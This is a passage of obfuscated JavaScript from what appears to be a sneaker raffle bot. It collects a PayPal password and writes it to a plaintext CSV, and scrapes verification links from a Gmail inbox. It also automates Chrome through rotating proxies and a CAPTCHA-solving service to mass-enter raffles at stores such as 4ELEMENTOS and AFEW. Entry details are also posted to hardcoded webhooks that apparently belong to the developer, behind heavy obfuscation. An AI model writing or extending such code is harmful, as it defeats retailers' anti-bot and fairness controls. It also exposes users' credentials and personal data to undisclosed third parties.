        var _0x55938e = Math['round'](Math['random']() * (_0x23cf22['length'] - 0x1));
        _0x389176['Proxy'] = _0x23cf22[_0x55938e], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x20a974 = await _0x2da047['get']('Password');
        return _0x389176['Password'] = _0x20a974['Password'], _0x25647b['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x389176['Email'] + ',' + _0x389176['Password'] + ',' + _0x389176['Proxy']), _0x389176;
    }
    let _0x29b51e = await _0xf6375a();
    var _0x410aef = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x17ed8f = await _0x2da047['get']('Amount'), _0x3d987c = _0x17ed8f['Amount'];
    async function _0x10e788() {
        let _0x8ab52b = 0x0;
        var _0x5b6585 = new _0x117139({
            'user': _0x2ab3b9['masterMail'],
            'password': _0x2ab3b9['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x51651c(_0x39d56f) {
            _0x5b6585['openBox']('INBOX', ![], _0x39d56f);
        }
        _0x5b6585['once']('ready', function () {
            _0x51651c(function (_0x219e69, _0x3b83f4) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x219e69)
                    throw _0x219e69;
                _0x5b6585['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x4ecaf3, _0x1bdc27) {
                    if (!_0x1bdc27 || !_0x1bdc27['length'])
                        console['log'](_0x2bc944() + '\x20[' + _0x5d6a51 + ']\x20No\x20mails\x20found'), _0x5b6585['end']();
                    else {
                        _0x1bdc27 = _0x1bdc27['slice'](0x0, _0x3d987c);
                        var _0x9324ce = _0x5b6585['seq']['fetch'](_0x1bdc27, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x9324ce['on']('message', function (_0x4d455a, _0x396084) {
                            var _0x177694 = '(#' + _0x396084 + ')\x20';
                            _0x4d455a['on']('body', function (_0x51986c, _0x5a0382) {
                                _0x414931(_0x51986c, (_0x78cfe8, _0x3d0f78) => {
                                    if (_0x3d0f78['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x3d0f78['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x3d0f78['text']['split']('[')[0x2];
                                        var _0x47b475 = mes['split'](']')[0x0];
                                        _0x410aef['push'](_0x47b475);
                                    }
                                });
                            }), _0x4d455a['once']('end', function () {
                                _0x8ab52b++;
                            });
                        }), _0x9324ce['once']('error', function (_0x133500) {
                            console['log']('Fetch\x20error:\x20' + _0x133500);
                        }), _0x9324ce['once']('end', function () {
                            _0x5b6585['end']();
                        });
                    }
                });
            });
        }), _0x5b6585['once']('error', function (_0x5294d6) {
            console['log'](_0x49a6ed['red'](_0x5294d6['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x5b6585['once']('end', async function () {
        }), _0x5b6585['connect']();
    }
    try {
        _0x10e788(), await _0x63aa6a(0xfa0), console['log']('Found\x20' + _0x410aef['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x63aa6a(0xfa0);
    }
    var _0x50e81e;
    _0x9474bc('' + _0x5d6a51);
    var _0x2cdbd2 = _0x29b51e['Proxy']['split'](':'), _0xbced18;
    try {
        _0xbced18 = await _0x555941['launch']({
            'userDataDir': 'sessions/' + _0x29b51e['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2cdbd2[0x0] + ':' + _0x2cdbd2[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0xbced18 = await _0x555941['launch']({
            'userDataDir': 'sessions/' + _0x29b51e['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2cdbd2[0x0] + ':' + _0x2cdbd2[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x2bc944() + '\x20[' + _0x5d6a51 + ']\x20Getting\x20Session');
        const _0x193e03 = await _0xbced18['newPage']();
        await _0x193e03['authenticate']({
            'username': '' + _0x2cdbd2[0x2],
            'password': '' + _0x2cdbd2[0x3]
        }), await _0x193e03['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x193e03['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x2bc944() + '\x20[' + _0x5d6a51 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x193e03['waitForSelector']('#email');
            let _0x4bf3a9 = await _0x193e03['$eval']('#email', _0x2740c7 => _0x2740c7['getAttribute']('value'));
            if (_0x4bf3a9 == '') {
                await _0x193e03['type']('#email', _0x29b51e['Email']), await _0x63aa6a(0x1d3);
                let _0x7b8323 = await _0x193e03['$']('#splitPassword');
                _0x7b8323 && (await _0x193e03['click']('#btnNext'), await _0x63aa6a(0xa28)), await _0x193e03['type']('#password', _0x29b51e['Password']), await _0x63aa6a(0x35c), await _0x193e03['click']('#btnLogin');
            } else
                await _0x193e03['type']('#password', _0x29b51e['Password']), await _0x63aa6a(0x35c), await _0x193e03['click']('#btnLogin');
            await _0x193e03['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x2bc944() + '\x20[' + _0x5d6a51 + ']\x20Successfully\x20logged\x20in'), await _0x63aa6a(0x2710);
        } catch (_0x3c7c53) {
            throw new Error('Login\x20session\x20expired\x20' + _0x3c7c53);
        }
        for (var _0x3bddcf = 0x0; _0x3bddcf < _0x410aef['length']; _0x3bddcf++) {
            console['log'](_0x2bc944() + '\x20[' + _0x5d6a51 + ']\x20Task\x20' + (_0x3bddcf + 0x1) + '\x20:\x20Starting\x20Verification'), _0x9474bc(_0x5d6a51 + '\x20Task\x20' + (_0x3bddcf + 0x1) + '\x20/\x20' + _0x410aef['length']);
            const _0x615f6 = await _0xbced18['newPage']();
            await _0x615f6['goto']('' + _0x410aef[_0x3bddcf], { 'waitUntil': 'networkidle2' }), await _0x63aa6a(0xbb8);
            try {
                const _0x264721 = await _0x615f6['$']('#challenge-heading');
                _0x264721 && (console['log'](_0x2bc944() + '\x20[' + _0x5d6a51 + ']\x20Task\x20' + (_0x3bddcf + 0x1) + '\x20:\x20' + _0x49a6ed['yellow']('2FA\x20Required')), await _0x615f6['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x63aa6a(0x9c40), await _0x615f6['waitForSelector']('#payment-submit-btn'), await _0x615f6['$eval']('#payment-submit-btn', _0x456d9f => _0x456d9f['click']()), await _0x615f6['click']('#payment-submit-btn');
                try {
                    await _0x615f6['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x63aa6a(0x5dc), console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x5d6a51 + ']\x20Task\x20' + (_0x3bddcf + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0xc8ce03) {
                    _0x4257c2 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0xc8ce03['message']);
                } finally {
                    if (_0x4257c2 == 'yes' && _0x39bb4c != 0x2) {
                        console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x5d6a51['name'] + ']\x20Task\x20' + (_0x3bddcf + 0x1) + '\x20:\x20Retrying\x20(' + _0x39bb4c + '\x20/\x205)')), _0x3bddcf = _0x3bddcf - 0x1, _0x39bb4c = _0x39bb4c + 0x1;
                        continue;
                    }
                    _0x4257c2 == 'yes' && _0x39bb4c >= 0x2 && (_0x11ea8b(csv[_0x3bddcf], _0x5d6a51), _0x4257c2 = 'no', _0x39bb4c = 0x0), await _0x615f6['close'](), await _0x63aa6a(0x4650);
                }
            } catch (_0x2ecf69) {
                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x5d6a51 + ']\x20Task\x20' + (_0x3bddcf + 0x1) + '\x20:\x20' + _0x2ecf69));
            }
        }
    } catch (_0x17fa91) {
        console['log'](_0x49a6ed['red']('' + _0x17fa91));
    } finally {
        await _0xbced18['close']();
    }
}
const _0x388222 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x547b5c, _0x529a2c, _0x3d8e27) {
                    _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2ab3b9['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x255a3f = 0x0; _0x255a3f < _0x529a2c['length']; _0x255a3f++) {
                        if (_0x3113e8 != 'yes')
                            var _0x3113e8 = '', _0x466358 = 0x0;
                        var _0x215699;
                        try {
                            await _0x5921e0(_0x529a2c, _0x255a3f);
                        } catch {
                            _0x3113e8 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x9474bc(_0x547b5c['name'] + '\x20Task\x20' + (_0x255a3f + 0x1) + '\x20/\x20' + _0x529a2c['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                        var _0x535411 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x21e003 = Math['round'](Math['random']() * (_0x535411['length'] - 0x1));
                        _0x529a2c[_0x255a3f]['Size'] == 'RANDOM' && (_0x529a2c[_0x255a3f]['Size'] = _0x535411[_0x21e003]);
                        var _0x4bffce = Math['round'](Math['random']() * (_0x3d8e27['length'] - 0x1)), _0x5dce14 = _0x3d8e27[_0x4bffce]['split'](':'), _0x4ad51c;
                        try {
                            _0x4ad51c = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5dce14[0x0] + ':' + _0x5dce14[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4ad51c = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5dce14[0x0] + ':' + _0x5dce14[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x2bc944() + '\x20[' + _0x547b5c['name'] + ']\x20Task\x20' + (_0x255a3f + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x2918d5 = await _0x4ad51c['newPage']();
                            await _0x2918d5['authenticate']({
                                'username': '' + _0x5dce14[0x2],
                                'password': '' + _0x5dce14[0x3]
                            }), await _0x2918d5['setRequestInterception'](!![]), _0x2918d5['on']('request', _0x1c992c => {
                                _0x1c992c['resourceType']() === 'image' || _0x1c992c['resourceType']() === 'font' || _0x1c992c['resourceType']() === 'media' ? _0x1c992c['abort']() : _0x1c992c['continue']();
                            }), await _0x2918d5['goto'](_0x529a2c[_0x255a3f]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x2bc944() + '\x20[' + _0x547b5c['name'] + ']\x20Task\x20' + (_0x255a3f + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x2918d5['waitForSelector']('#accept-all-gdpr'), await _0x2918d5['click']('#accept-all-gdpr'), await _0x2918d5['waitForSelector']('#raffles-product'), await _0x63aa6a(0x3e8), await _0x2918d5['$eval']('#raffles-product', _0x3dde0c => _0x3dde0c['click']()), await _0x63aa6a(0x1388), await _0x2918d5['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x1815d2 = await _0x2918d5['$']('.fancybox-inner\x20>\x20iframe'), _0x2368a5 = await _0x1815d2['contentFrame']();
                            console['log'](_0x2bc944() + '\x20[' + _0x547b5c['name'] + ']\x20Task\x20' + (_0x255a3f + 0x1) + '\x20:\x20Checking\x20Information'), await _0x2368a5['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x63aa6a(0x1f4), await _0x2368a5['type']('input[name=\x22sm-form-email\x22]', _0x529a2c[_0x255a3f]['Email']), await _0x63aa6a(0xc8), await _0x2368a5['type']('input[name=\x22sm-form-name\x22]', _0x529a2c[_0x255a3f]['FirstName'] + '\x20' + _0x529a2c[_0x255a3f]['LastName']), await _0x63aa6a(0xc8), await _0x2368a5['type']('input[name=\x22sm-form-street\x22]', _0x529a2c[_0x255a3f]['Address1'] + '\x20' + _0x529a2c[_0x255a3f]['HouseNumber'] + '\x20' + _0x529a2c[_0x255a3f]['Address2']), await _0x63aa6a(0xc8), await _0x2368a5['type']('input[name=\x22sm-form-city\x22]', _0x529a2c[_0x255a3f]['City']), await _0x63aa6a(0xc8), await _0x2368a5['type']('input[name=\x22sm-form-province\x22]', _0x529a2c[_0x255a3f]['State']), await _0x63aa6a(0xc8), await _0x2368a5['type']('input[name=\x22sm-form-zip\x22]', _0x529a2c[_0x255a3f]['Zip']), await _0x63aa6a(0xc8), await _0x2368a5['type']('input[name=\x22sm-form-country\x22]', _0x529a2c[_0x255a3f]['Country']), await _0x63aa6a(0xc8), await _0x2368a5['type']('input[name=\x22sm-form-phone\x22]', _0x529a2c[_0x255a3f]['Phone']), await _0x63aa6a(0xc8), await _0x2368a5['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x529a2c[_0x255a3f]['Follower']), await _0x63aa6a(0xc8), await _0x2368a5['type']('input[name=\x22sm-cst.size\x22]', _0x529a2c[_0x255a3f]['Size']), await _0x63aa6a(0x1f4), await _0x2368a5['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x63aa6a(0x1f4), await _0x2368a5['click']('.icheckbox_simple-custom'), await _0x63aa6a(0x1f4), console['log'](_0x2bc944() + '\x20[' + _0x547b5c['name'] + ']\x20Task\x20' + (_0x255a3f + 0x1) + '\x20:\x20Sending\x20Request'), await _0x2368a5['$eval']('form', _0x283dab => _0x283dab['submit']()), console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x547b5c['name'] + ']\x20Task\x20' + (_0x255a3f + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x3113e8 = '';
                            var _0xc01604 = await _0x198507(_0x529a2c[_0x255a3f], _0x547b5c, 'dev', ![]), _0x391aad = await _0x198507(_0x529a2c[_0x255a3f], _0x547b5c, 'pub', ![]);
                            const _0x4ef413 = {
                                'succesDEVMSG': { 'embeds': [_0xc01604] },
                                'succesPUBMSG': { 'embeds': [_0x391aad] }
                            };
                            try {
                                _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x4ef413['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x4ef413['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x595b38, _0x4ef413['succesPUBMSG']);
                            } catch (_0x28bfc9) {
                                console['log'](_0x49a6ed['yellow'](_0x2bc944() + '\x20[' + _0x547b5c['name'] + ']\x20Task\x20' + (_0x255a3f + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x28bfc9));
                            }
                        } catch (_0xccf3c9) {
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x547b5c['name'] + ']\x20Task\x20' + (_0x255a3f + 0x1) + '\x20:\x20' + _0xccf3c9)), _0x215699 = '' + _0xccf3c9;
                            var _0x5cdf47 = await _0x198507(_0x529a2c[_0x255a3f], _0x547b5c, 'dev', !![], _0x215699), _0xc01604 = await _0x198507(_0x529a2c[_0x255a3f], _0x547b5c, 'dev', ![]), _0x391aad = await _0x198507(_0x529a2c[_0x255a3f], _0x547b5c, 'pub', ![]);
                            const _0xf18c4d = {
                                'succesDEVMSG': { 'embeds': [_0xc01604] },
                                'succesPUBMSG': { 'embeds': [_0x391aad] }
                            };
                            _0xf18c4d['errorDEV'] = { 'embeds': [_0x5cdf47] }, _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0xf18c4d['errorDEV']), await _0x56185b(_0x3c02fa, _0xf18c4d['errorDEV']), _0xccf3c9 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x3113e8 = 'yes');
                        } finally {
                            _0x4ad51c['close']();
                            if (_0x3113e8 == 'yes' && _0x466358 != 0x5 && _0x215699 != 'Size\x20Not\x20Found') {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x547b5c['name'] + ']\x20Task\x20' + (_0x255a3f + 0x1) + '\x20:\x20Retrying\x20(' + _0x466358 + '\x20/\x205)\x20')), _0x255a3f = _0x255a3f - 0x1, _0x466358 = _0x466358 + 0x1;
                                continue;
                            }
                            _0x3113e8 == 'yes' && _0x466358 >= 0x5 && (_0x11ea8b(_0x529a2c[_0x255a3f], _0x547b5c), _0x3113e8 = 'no', _0x466358 = 0x0), console['log'](_0x2bc944() + '\x20[' + _0x547b5c['name'] + ']\x20Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x5ea9c4, _0x1b3db4) {
                    var _0x2ba93e = [];
                    async function _0x3fa41e() {
                        var _0x2c48fc = new _0x117139({
                            'user': _0x2ab3b9['masterMail'],
                            'password': _0x2ab3b9['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x59ec7b(_0x1760cb) {
                            _0x2c48fc['openBox']('INBOX', ![], _0x1760cb);
                        }
                        _0x2c48fc['once']('ready', function () {
                            _0x59ec7b(function (_0xa70fed, _0x435119) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0xa70fed)
                                    throw _0xa70fed;
                                _0x2c48fc['seq']['search'](['UNSEEN'], function (_0xc0cd98, _0xfb1f72) {
                                    if (!_0xfb1f72 || !_0xfb1f72['length'])
                                        console['log'](_0x2bc944() + '\x20[' + _0x5ea9c4['name'] + ']\x20No\x20mails\x20found'), _0x2c48fc['end']();
                                    else {
                                        var _0x5bf797 = _0x2c48fc['seq']['fetch'](_0xfb1f72, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x5bf797['on']('message', function (_0x1a8130, _0x4a2992) {
                                            var _0x4f9159 = '(#' + _0x4a2992 + ')\x20';
                                            _0x1a8130['on']('body', function (_0x34dada, _0x2a30c7) {
                                                _0x414931(_0x34dada, (_0x41e52a, _0x1bb2cc) => {
                                                    if (_0x1bb2cc['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0xc00088 = _0x1bb2cc['html']['split']('\x0a');
                                                        for (var _0x1c70af = 0x0; _0x1c70af < _0xc00088['length']; _0x1c70af++) {
                                                            if (_0xc00088[_0x1c70af]['includes']('salesmanago') && _0xc00088[_0x1c70af]['includes']('<td') && _0xc00088[_0x1c70af]['includes']('href')) {
                                                                var _0x34cbbb = _0xc00088[_0x1c70af]['split']('href=\x22'), _0x468e2f = _0x34cbbb[0x1]['split']('\x22')[0x0];
                                                                _0x2ba93e['push'](_0x468e2f);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x1a8130['once']('end', function () {
                                            });
                                        }), _0x5bf797['once']('error', function (_0xd16259) {
                                            console['log']('Fetch\x20error:\x20' + _0xd16259);
                                        }), _0x5bf797['once']('end', function () {
                                            _0x2c48fc['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x2c48fc['once']('error', function (_0x1bb03f) {
                            console['log'](_0x49a6ed['red'](_0x1bb03f['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x2c48fc['once']('end', async function () {
                        }), _0x2c48fc['connect']();
                    }
                    async function _0x502330(_0x1bf7e1, _0x13ae0c, _0x18de25) {
                        for (var _0x2e5eea = 0x0; _0x2e5eea < _0x13ae0c['length']; _0x2e5eea++) {
                            async function _0x3ea1ad(_0x4172ad, _0x2af35d, _0x1797a7, _0x1c8712, _0x462abc) {
                                var _0x3c4b58, _0x4303c9 = {}, _0x77bcaf = [], _0x1726f9 = {}, _0x3e3d30 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x3937e4 = Math['round'](Math['random']() * (_0x3e3d30['length'] - 0x1));
                                _0x1c8712[_0x4172ad]['Size'] == 'RANDOM' && (_0x1c8712[_0x4172ad]['Size'] = _0x3e3d30[_0x3937e4]);
                                !_0x1c8712 && (_0x1c8712 = {});
                                if (_0x2ab3b9['useRandomProxy'] = ![])
                                    var _0x137f5d = _0x462abc[_0x4172ad]['split'](':');
                                else
                                    var _0x5ad6ad = Math['round'](Math['random']() * (_0x462abc['length'] - 0x1)), _0x137f5d = _0x462abc[_0x5ad6ad]['split'](':');
                                var _0x405bb1 = {
                                    'jar': _0x40bca5,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x1797a7['url'],
                                    'headers': _0x1797a7['headers'],
                                    'body': JSON['stringify'](_0x4303c9),
                                    'proxy': 'http://' + _0x137f5d[0x2] + ':' + _0x137f5d[0x3] + '@' + _0x137f5d[0x0] + ':' + _0x137f5d[0x1]
                                };
                                return _0x2af35d != 'ver' && (_0x405bb1['url'] = _0x1797a7['url'], _0x405bb1['headers'] = _0x1797a7['headers']), _0x2af35d == 'ver' && (_0x405bb1['method'] = 'GET', _0x405bb1['url'] = _0x1c8712[_0x4172ad]), new Promise(function (_0x1afde2, _0x740905) {
                                    callback = async (_0x500c9b, _0x41f5ce, _0x288a0b) => {
                                        if (!_0x500c9b && _0x41f5ce['statusCode'] == 0xca || !_0x500c9b && _0x41f5ce['statusCode'] == 0xc8) {
                                            if (_0x2af35d != 'ver') {
                                                var _0xd0d36e = await _0x198507(_0x1c8712[_0x4172ad], _0x1797a7, 'dev', ![]), _0x2f3805 = await _0x198507(_0x1c8712[_0x4172ad], _0x1797a7, 'pub', ![]);
                                                const _0x27a800 = {
                                                    'succesDEVMSG': { 'embeds': [_0xd0d36e] },
                                                    'succesPUBMSG': { 'embeds': [_0x2f3805] }
                                                };
                                                if (_0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '')
                                                    try {
                                                        await _0x56185b(_0x2ab3b9['webhook'], _0x27a800['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x27a800['succesDEVMSG']), await _0x63aa6a(0xc8);
                                                try {
                                                    await _0x56185b(_0x595b38, _0x27a800['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x1ab0d7(_0x1c8712[_0x4172ad], _0x1797a7);
                                            }
                                            _0x1afde2(console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x1797a7['name'] + ']\x20Task\x20' + (_0x4172ad + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x2af35d != 'ver') {
                                                var _0x129c33 = '' + _0x500c9b, _0x2823ac = await _0x198507(_0x1c8712[_0x4172ad], _0x1797a7, 'dev', !![], _0x129c33), _0x5e4778 = {};
                                                _0x5e4778['errorDEV'] = { 'embeds': [_0x2823ac] }, _0x11ea8b(_0x1c8712[_0x4172ad], _0x1797a7), _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x5e4778['errorDEV']), await _0x56185b(_0x3c02fa, _0x5e4778['errorDEV']);
                                            }
                                            _0x740905(console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x1797a7['name'] + ']\x20Task\x20' + (_0x4172ad + 0x1) + ':\x20' + _0x500c9b)));
                                        }
                                    };
                                    try {
                                        _0x2af35d != 'ver' ? console['log'](_0x2bc944() + '\x20[' + _0x1797a7['name'] + ']\x20Task\x20' + (_0x4172ad + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4303c9['data']['attributes']['email']) : console['log'](_0x2bc944() + '\x20[' + _0x1797a7['name'] + ']\x20Task\x20' + (_0x4172ad + 0x1) + ':\x20Fetching\x20Response'), _0xd1570a(_0x405bb1, callback);
                                    } catch (_0x50a06c) {
                                        console['log'](_0x2bc944() + '\x20Task\x20' + (_0x4172ad + 0x1) + ':\x20' + _0x50a06c);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x3ea1ad(_0x2e5eea, 'ver', _0x1bf7e1, _0x13ae0c, _0x18de25), console['log'](_0x2bc944() + '\x20[' + _0x1bf7e1['name'] + ']\x20Sleeping\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                            } catch (_0x4aeeed) {
                            }
                        }
                    }
                    try {
                        _0x3fa41e(), await _0x63aa6a(0xfa0), console['log']('Found\x20' + _0x2ba93e['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x502330(_0x5ea9c4, _0x2ba93e, _0x1b3db4);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x3abdd4, _0x4003bb, _0x5177ed) {
                for (var _0x25b76d = 0x0; _0x25b76d < _0x4003bb['length']; _0x25b76d++) {
                    _0x2ab3b9['AfewDelay'] = _0x2ab3b9['delay'];
                    var _0x1cf9b4;
                    if (_0x2a71e9 != 'yes')
                        var _0x2a71e9 = '', _0x3dd644 = 0x0;
                    var _0x241d48 = _0x4003bb[_0x25b76d]['Url'], _0x3367ed = _0x4003bb[_0x25b76d];
                    _0x9474bc(_0x3abdd4['name'] + '\x20Task\x20' + (_0x25b76d + 0x1) + '\x20/\x20' + _0x4003bb['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                    try {
                        await _0x5921e0(_0x4003bb, _0x25b76d);
                    } catch {
                        _0x2a71e9 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x41a8b8(_0x490273) {
                        const _0x572158 = _0x25647b['readFileSync']('../successful-tasks.csv', 'utf8'), _0x24ad42 = _0x20cf77['parse'](_0x572158, { 'header': !![] })['data'];
                        let _0x498974 = ![];
                        for (var _0x355fd8 of _0x24ad42) {
                            if (_0x355fd8['Url'] == _0x490273['Url'] && _0x355fd8['Email'] == _0x490273['Email']) {
                                _0x498974 = !![];
                                break;
                            }
                        }
                        return _0x498974;
                    }
                    if (await _0x41a8b8(_0x4003bb[_0x25b76d]) == !![]) {
                        console['log'](_0x2bc944() + '\x20[' + _0x3abdd4['name'] + ']\x20Task\x20' + (_0x25b76d + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x2db512 = await _0x198507(_0x4003bb[_0x25b76d], _0x3abdd4, 'dev', ![]), _0x1a59b9 = await _0x198507(_0x4003bb[_0x25b76d], _0x3abdd4, 'pub', ![]);
                    const _0x4f95b8 = {
                        'succesDEVMSG': { 'embeds': [_0x2db512] },
                        'succesPUBMSG': { 'embeds': [_0x1a59b9] }
                    };
                    if (_0x4003bb[_0x25b76d]['Email'] == '' || _0x4003bb[_0x25b76d]['FirstName'] == '' || _0x4003bb[_0x25b76d]['LastName'] == '' || _0x4003bb[_0x25b76d]['Country'] == '' || _0x4003bb[_0x25b76d]['Size'] == '' || _0x4003bb[_0x25b76d]['Address1'] == '' || _0x4003bb[_0x25b76d]['Zip'] == '') {
                        console['log'](_0x2bc944() + '\x20[' + _0x3abdd4['name'] + ']\x20Task\x20' + (_0x25b76d + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2ab3b9['useRandomProxy'] = ![])
                        var _0x5ad775 = _0x5177ed[_0x25b76d]['split'](':');
                    else
                        var _0x1461e8 = Math['round'](Math['random']() * (_0x5177ed['length'] - 0x1)), _0x5ad775 = _0x5177ed[_0x1461e8]['split'](':');
                    var _0x2e1be9;
                    try {
                        _0x2e1be9 = await _0x555941['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5ad775[0x0] + ':' + _0x5ad775[0x1],
